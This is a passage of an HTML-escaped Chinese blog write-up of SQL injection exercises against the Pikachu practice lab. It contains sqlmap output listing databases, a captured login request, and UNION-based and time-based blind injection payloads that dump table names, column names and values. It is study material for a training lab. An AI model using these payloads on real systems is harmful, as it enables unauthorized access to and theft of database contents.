class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;D:\othertools\sqlmap-py&amp;gt;python sqlmap.py -u http://www.pikachu.com/vul/sqli/sqli_del.php?id=57 --dbs --batch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ___&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       __H__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ___ ___[&amp;quot;]_____ ___ ___  &amp;#123;1.4.9.8#dev&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|_ -| . [.]     | .&amp;#x27;| . |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|___|_  [&amp;#x27;]_|_|_|__,|  _|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      |_|V...       |_|   http://sqlmap.org&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&amp;#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] starting @ 10:11:16 /2020-11-04/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:16] [INFO] resuming back-end DBMS &amp;#x27;mysql&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:17] [INFO] testing connection to the target URL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;you have not declared cookie(s), while server wants to set its own (&amp;#x27;PHPSESSID=3q2hir937ep...ecom1vat5s&amp;#x27;). Do you want to use those [Y/n] Y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap resumed the following injection point(s) from stored session:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;---&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Parameter: id (GET)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Type: boolean-based blind&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Title: Boolean-based blind - Parameter replace (original value)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Payload: id=(SELECT (CASE WHEN (2154=2154) THEN 61 ELSE (SELECT 6834 UNION SELECT 3017) END))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Type: error-based&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Payload: id=61 AND (SELECT 5347 FROM(SELECT COUNT(*),CONCAT(0x716b717671,(SELECT (ELT(5347=5347,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Type: time-based blind&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Payload: id=61 AND (SELECT 9106 FROM (SELECT(SLEEP(5)))xjCI)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;---&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] the back-end DBMS is MySQL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;web application technology: PHP, PHP 7.3.4, Apache 2.4.39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;back-end DBMS: MySQL &amp;gt;= 5.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] fetching database names&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;information_schema&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;bookstore&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;dvwa&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;edusys&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;exam&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;fresh&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;hotel&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;hy&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;hy2&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;mysql&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;news&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;pentest&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;performance_schema&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;pikachu&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;store&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;student&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;test&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] resumed: &amp;#x27;vote&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;available databases [18]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] bookstore&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] dvwa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] edusys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] exam&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] fresh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] hotel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] hy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] hy2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] information_schema&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] news&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] pentest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] performance_schema&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] pikachu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] store&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] student&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] vote&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[10:11:19] [INFO] fetched data logged to text files under &amp;#x27;C:\Users\lenovo\AppData\Local\sqlmap\output\www.pikachu.com&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;h2 id=&#34;http头注入未解决&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http头注入未解决&#34;&gt;#&lt;/a&gt; http 头注入（未解决）&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用提示里面的账户密码后登录，显示：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;你的ip地址:127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;你的user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;你的端口（本次连接）:tcp14766&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;说明这些头信息可能都被存进数据库了，可以进行 sql 注入&lt;/p&gt;
&lt;p&gt;用 bp 抓到的包：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /vul/sqli/sqli_header/sqli_header_login.php HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: www.pikachu.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://www.pikachu.com/vul/sqli/sqli_header/sqli_header_login.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Origin: http://www.pikachu.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: PHPSESSID=1h9tm55rqj71244okk7do3ch0q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Pragma: no-cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cache-Control: no-cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;username=a&amp;amp;password=a&amp;amp;submit=Login&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;删掉一个加单引号，没报错，用网上的 payload 也不报错，神了个奇：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-sql-005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;盲注base-on-boolean&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#盲注base-on-boolean&#34;&gt;#&lt;/a&gt; 盲注 (base  on boolean)&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.pikachu.com/vul/sqli/sqli_blind_b.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=lili&amp;#x27; and &amp;#x27;1&amp;#x27;=&amp;#x27;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp;submit=%E6%9F%A5%E8%AF%A2#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;正常输出：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-sql-006.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.pikachu.com/vul/sqli/sqli_blind_b.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=lili&amp;#x27; or &amp;#x27;1&amp;#x27;=&amp;#x27;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp;submit=%E6%9F%A5%E8%AF%A2#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;您输入的username不存在，请重新输入！&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可能是因为只能输出一个对象，payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&amp;#x27; union select database(), &amp;#x27;1&amp;#x27;=&amp;#x27;1&amp;amp;submit=%E6%9F%A5%E8%AF%A2#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出数据库，确定是一个对象，两个字段：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;your uid:pikachuyour email is: 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆表：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&amp;#x27; union select database(), group_concat(table_name)  from information_schema.tables where table_schema = &amp;#x27;pikachu&amp;#x27; and &amp;#x27;1&amp;#x27;=&amp;#x27;1&amp;amp;submit=%E6%9F%A5%E8%AF%A2#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;uid:pikachu&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;your email is: httpinfo,member,message,users,xssblind&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出字段：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;email is: id,userid,ipaddress,useragent,httpaccept,remoteport&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;your email is: id,userid,ipaddress,useragent,httpaccept,remoteport&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以通过 group_concat () 分别输出每个字段所有的值，payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?name=lilijmknh&amp;#x27; union select database(),group_concat(id) from httpinfo where &amp;#x27;1&amp;#x27;=&amp;#x27;1&amp;amp;submit=%E6%9F%A5%E8%AF%A2#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;your uid:pikachuyour email is: 42,43,44,45,46,47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;h2 id=&#34;盲注base-on-time未成功实现-500&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#盲注base-on-time未成功实现-500&#34;&gt;#&lt;/a&gt; 盲注 (base on time)，未成功实现 ，500&lt;/h2&gt;
&lt;p&gt;这个就是利用二分法查 ascii 码值，手工注入的话很费时间的把&lt;/p&gt;
&lt;p&gt;靠，他根本就不关心我是谁！我要去看源码了！&lt;/p&gt;
&lt;p&gt;发现果然是盲注，不管是不是查到，都是输出 i don’t care who you are!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;payload，报 500 了:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.pikachu.com/vul/sqli/sqli_blind_t.php?name=&amp;#x27; or (length(database())&amp;gt;1 and sleep(10)) and &amp;#x27;1&amp;#x27;=&amp;#x27;1&amp;amp;submit=%E6%9F%A5%E8%AF%A2#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
